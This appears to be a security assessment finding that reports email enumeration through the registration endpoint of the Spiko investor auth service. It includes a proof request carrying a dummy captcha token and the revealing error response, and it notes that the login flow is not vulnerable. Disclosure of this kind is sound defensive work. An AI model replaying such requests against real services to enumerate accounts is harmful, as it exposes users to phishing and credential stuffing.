# F020 - Email Enumeration via Registration Flow

## Summary

| Field | Value |
|-------|-------|
| Severity | Low |
| CVSS 3.1 | 5.3 (AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N) |
| OWASP | A07:2021 - Identification and Authentication Failures |
| Endpoint | `POST https://investor-auth.spiko.io/self-service/registration` |
| Status | Confirmed |

## Description

The registration flow returns a distinct error message when attempting to register with an email address already in use. This reveals whether a specific email address has an account. Combined with F018 (CAPTCHA bypass), this allows automated email enumeration at scale.

Note: The login flow is NOT vulnerable to enumeration -- it returns identical generic error messages for both known and unknown email addresses.

## Impact

- Attacker can determine which email addresses have Spiko investor accounts
- Combined with F018, this can be fully automated without CAPTCHA constraints
- Enumerated emails could be used for targeted phishing or credential stuffing

## Proof

**Request (registration with existing email):**
```http
POST /self-service/registration?flow=<flow_id> HTTP/2
Host: investor-auth.spiko.io
Content-Type: application/json

{
  "method": "password",
  "password": "AnotherPass2026!",
  "transient_payload": {"captcha_token": "dummy"},
  "traits": {
    "first_name": "Duplicate",
    "last_name": "Test",
    "email": "spiko.test.alpha.29oct@proton.me",
    "preferences": {"locale": "en", "investorAppMode": "standard"}
  }
}
```

**Response (email exists):**
```json
{
  "ui": {
    "messages": [{
      "id": 1010016,
      "text": "You tried signing in with spiko.test.alpha.29oct@proton.me which is already in use by another account. You can sign in using your password.",
      "type": "error"
    }]
  }
}
```

**Comparison -- login flow error messages (NOT vulnerable):**

Known email, wrong password:
`"The provided credentials are invalid, check for spelling mistakes in your password or username, email address, or phone number."`

Unknown email, wrong password:
`"The provided credentials are invalid, check for spelling mistakes in your password or username, email address, or phone number."`

Both responses are identical -- no enumeration possible via login.
